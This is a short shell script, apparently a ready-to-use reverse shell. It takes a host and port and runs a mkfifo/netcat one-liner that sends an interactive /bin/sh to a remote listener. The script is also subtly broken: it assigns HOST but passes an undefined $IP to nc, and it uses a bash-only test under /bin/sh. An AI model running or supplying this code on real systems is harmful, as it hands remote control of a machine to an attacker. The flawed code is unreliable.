#!/bin/sh
if [[ -z "$1" || -z "$2" ]]; then
    echo "Usage ./reverse_shell.sh <host> <port>"
    exit 1
fi
HOST="$1"
PORT=$2
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
